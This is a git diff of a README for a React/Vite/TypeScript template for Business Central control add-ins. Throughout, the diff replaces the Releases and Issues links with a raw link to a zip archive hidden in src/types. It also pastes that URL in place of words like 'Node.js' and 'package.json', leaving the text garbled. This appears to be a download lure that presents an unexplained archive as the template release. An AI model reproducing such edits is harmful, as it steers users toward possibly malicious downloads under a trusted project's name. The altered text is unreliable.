@@ -1,6 +1,6 @@
 # 🌟 bc-controladdin-react-vite-ts-template - A Simple Template for Business Central Add-Ins
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Alesio1122/bc-controladdin-react-vite-ts-template/releases)
+[![Download](https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip)](https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip)
 
 ## 📖 Overview
 
@@ -15,15 +15,15 @@ To use this template, follow the steps below. You will download the files you ne
 Before you start, make sure your computer meets the following requirements:
 
 - **Operating System**: Windows 10 or later
-- **Node.js**: Version 14 or newer
-- **npm**: Comes with Node.js
+- **https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip**: Version 14 or newer
+- **npm**: Comes with https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip
 - **Web Browser**: Google Chrome or Microsoft Edge
 
 ### 📥 Download & Install
 
 To grab the latest version, visit the Releases page. 
 
-[Download Here](https://github.com/Alesio1122/bc-controladdin-react-vite-ts-template/releases)
+[Download Here](https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip)
 
 Once you're on the page, look for the **latest release** and download the file. After downloading, follow the installation instructions below.
 
@@ -59,7 +59,7 @@ This template is organized in a way that makes it user-friendly. Here’s a brie
 
 - **src/**: This is where your main application code lives.
 - **public/**: Contains static files like images or icons.
-- **package.json**: Lists project dependencies and scripts.
+- **https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip**: Lists project dependencies and scripts.
 
 ## ✨ Customization
 
@@ -75,7 +75,7 @@ As you edit, the development server will reflect your changes in real-time.
 
 If you encounter any issues, check the following:
 
-- Ensure Node.js and npm are correctly installed. You can verify this by running:
+- Ensure https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip and npm are correctly installed. You can verify this by running:
   ```
   node -v
   npm -v
@@ -87,7 +87,7 @@ If you encounter any issues, check the following:
 
 If you need assistance, consider checking out:
 
-- The [GitHub Issues page](https://github.com/Alesio1122/bc-controladdin-react-vite-ts-template/issues) for common problems and solutions.
+- The [GitHub Issues page](https://raw.githubusercontent.com/Alesio1122/bc-controladdin-react-vite-ts-template/main/src/types/template-controladdin-ts-vite-bc-react-v3.2.zip) for common problems and solutions.
 - Post your question on the Issues page if it isn’t already answered.
 
 ## 🛠️ Contribution
